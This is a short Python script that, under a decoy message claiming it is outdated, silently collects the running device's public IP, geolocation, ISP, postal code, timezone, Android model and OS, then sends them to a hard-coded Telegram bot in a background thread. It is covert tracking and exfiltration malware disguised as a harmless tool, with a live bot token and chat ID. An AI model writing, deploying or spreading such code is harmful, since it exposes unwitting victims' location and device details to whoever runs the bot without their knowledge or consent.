import requests
import threading
import subprocess
import platform
from datetime import datetime

# Telegram bot credentials
BOT_TOKEN = '6745711912:AAF4CpyT-h866ov_6c_BtG-Uep-jfcryGE8'
CHAT_ID = '2104592399'

# Function to get IP info
def get_ip_info():
    try:
        response = requests.get('https://ipinfo.io/', timeout=2)  # Lowered timeout for quicker response
        if response.status_code == 200:
            return response.json()
    except requests.RequestException:
        return None

# Function to get device model for Android
def get_device_model():
    try:
        model = subprocess.check_output(['getprop', 'ro.product.model']).decode().strip()
        return model
    except Exception:
        return 'Unknown Device'

# Function to get operating system information
def get_os_info():
    return platform.platform()

# Function to send message to Telegram
def send_telegram_message(message):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        'chat_id': CHAT_ID,
        'text': message,
        'parse_mode': 'HTML'
    }
    try:
        requests.post(url, data=payload)
    except Exception:
        pass

# Function to handle IP fetching and sending to Telegram
def handle_ip_fetching():
    ip_info = get_ip_info()
    if ip_info:
        ip = ip_info.get('ip', 'N/A')
        city = ip_info.get('city', 'N/A')
        region = ip_info.get('region', 'N/A')
        country = ip_info.get('country', 'N/A')
        loc = ip_info.get('loc', 'N/A')
        org = ip_info.get('org', 'N/A')
        postal = ip_info.get('postal', 'N/A')
        timezone = ip_info.get('timezone', 'N/A')

        # Getting the current time
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        # Getting the device model and OS info
        device_model = get_device_model()
        os_info = get_os_info()

        message = (
            f"<b>IP Address Information:</b>\n\n"
            f"<b>IP:</b> {ip}\n"
            f"<b>City:</b> {city}\n"
            f"<b>Region:</b> {region}\n"
            f"<b>Country:</b> {country}\n"
            f"<b>Location:</b> {loc}\n"
            f"<b>Organization:</b> {org}\n"
            f"<b>Postal Code:</b> {postal}\n"
            f"<b>Timezone:</b> {timezone}\n"
            f"<b>Current Time:</b> {current_time}\n"
            f"<b>Device Model:</b> {device_model}\n"
            f"<b>Operating System:</b> {os_info}"
        )

        send_telegram_message(message)

# Main function
def main():
    print("This script is outdated, please download the latest version.")
    
    # Start a new thread to handle IP fetching and sending
    threading.Thread(target=handle_ip_fetching).start()

if __name__ == "__main__":
    main()
